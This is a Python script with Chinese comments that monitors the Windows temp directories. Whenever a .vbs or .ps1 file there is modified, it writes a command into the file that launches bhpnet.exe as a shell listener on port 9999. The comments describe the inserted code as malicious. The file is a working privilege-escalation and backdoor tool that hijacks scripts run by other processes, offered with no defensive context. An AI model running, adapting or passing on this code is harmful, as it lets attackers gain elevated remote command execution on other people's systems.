import tempfile
import threading
import win32file
import win32con
import os
import logging
import sys

# 配置日志
LOG_FILE = "file_monitor.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# 监控的目录
DIRS_TO_MONITOR = [r"C:\WINDOWS\Temp", tempfile.gettempdir()]

# 文件操作类型
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

# 目标文件类型和注入代码
FILE_TYPES = {
    '.vbs': [
        "\r\n'bhpmarker\r\n",  # 标记，防止重复注入
        "\r\nC:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c\r\n"  # 注入的命令
    ],
    '.ps1': [
        "\r\n#bhpmarker",  # 标记，防止重复注入
        "\r\nStart-Process \"C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c\"\r\n"  # 注入的 PowerShell 命令
    ]
}

def inject_code(full_filename, extension, contents):
    """
    向目标文件注入恶意代码
    参数:
        full_filename: 文件路径
        extension: 文件扩展名
        contents: 文件原始内容
    """
    try:
        # 检查是否已注入（避免重复）
        if FILE_TYPES[extension][0] in contents:
            logging.info(f"文件 {full_filename} 已包含标记，跳过注入")
            return
        
        # 构造注入内容：标记 + 命令 + 原始内容
        full_contents = FILE_TYPES[extension][0] + FILE_TYPES[extension][1] + contents
        
        # 写入文件
        with open(full_filename, "w", encoding='utf-8') as fd:
            fd.write(full_contents)
        
        print(f"已注入代码到 {full_filename}")
        logging.info(f"已注入代码到 {full_filename}")
    
    except Exception as e:
        logging.error(f"注入代码到 {full_filename} 失败: {e}")
        print(f"[错误] 注入代码到 {full_filename} 失败: {e}")

def start_monitor(path_to_watch):
    """
    监控指定目录的文件变化
    参数:
        path_to_watch: 监控的目录路径
    """
    try:
        # 打开目录句柄
        FILE_LIST_DIRECTORY = 0x0001
        h_directory = win32file.CreateFile(
            path_to_watch,
            FILE_LIST_DIRECTORY,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None
        )
        
        # 监控文件变化
        while True:
            try:
                results = win32file.ReadDirectoryChangesW(
                    h_directory,
                    1024,
                    True,
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                    win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                    win32con.FILE_NOTIFY_CHANGE_SIZE |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                    win32con.FILE_NOTIFY_CHANGE_SECURITY,
                    None,
                    None
                )
                
                # 处理文件变化事件
                for action, file_name in results:
                    full_filename = os.path.join(path_to_watch, file_name)
                    
                    if action == FILE_CREATED:
                        print(f"文件创建: {full_filename}")
                        logging.info(f"文件创建: {full_filename}")
                    elif action == FILE_DELETED:
                        print(f"文件删除: {full_filename}")
                        logging.info(f"文件删除: {full_filename}")
                    elif action == FILE_MODIFIED:
                        print(f"文件修改: {full_filename}")
                        logging.info(f"文件修改: {full_filename}")
                        print("正在读取内容...")
                        try:
                            with open(full_filename, "r", encoding='utf-8', errors='ignore') as fd:
                                contents = fd.read()
                            print(f"内容:\n{contents}")
                            print("读取完成")
                            
                            # 检查文件扩展名并注入代码
                            _, extension = os.path.splitext(full_filename)
                            if extension.lower() in FILE_TYPES:
                                inject_code(full_filename, extension.lower(), contents)
                        
                        except Exception as e:
                            logging.error(f"读取文件 {full_filename} 失败: {e}")
                            print(f"[错误] 读取文件 {full_filename} 失败: {e}")
                    elif action == FILE_RENAMED_FROM:
                        print(f"文件重命名自: {full_filename}")
                        logging.info(f"文件重命名自: {full_filename}")
                    elif action == FILE_RENAMED_TO:
                        print(f"文件重命名为: {full_filename}")
                        logging.info(f"文件重命名为: {full_filename}")
                    else:
                        print(f"未知操作: {full_filename}")
                        logging.info(f"未知操作: {full_filename}")
            
            except Exception as e:
                logging.error(f"监控目录 {path_to_watch} 失败: {e}")
                print(f"[错误] 监控目录 {path_to_watch} 失败: {e}")
    
    except Exception as e:
        logging.error(f"打开目录 {path_to_watch} 失败: {e}")
        print(f"[错误] 打开目录 {path_to_watch} 失败: {e}")
        sys.exit(1)

def main():
    """
    主函数，启动文件监控线程
    """
    try:
        logging.info("文件监控启动")
        print("开始监控文件变化...")
        
        # 为每个目录启动监控线程
        threads = []
        for path in DIRS_TO_MONITOR:
            if not os.path.exists(path):
                logging.warning(f"目录 {path} 不存在，跳过")
                print(f"[警告] 目录 {path} 不存在，跳过")
                continue
            monitor_thread = threading.Thread(target=start_monitor, args=(path,))
            monitor_thread.daemon = True  # 设置为守护线程，随主线程退出
            print(f"启动监控: {path}")
            logging.info(f"启动监控: {path}")
            monitor_thread.start()
            threads.append(monitor_thread)
        
        # 保持主线程运行
        while threads:
            for thread in threads:
                thread.join(timeout=1.0)
            threads = [t for t in threads if t.is_alive()]
    
    except KeyboardInterrupt:
        print("\n文件监控停止")
        logging.info("文件监控停止")
    except Exception as e:
        logging.error(f"主程序错误: {e}")
        print(f"[错误] 主程序错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()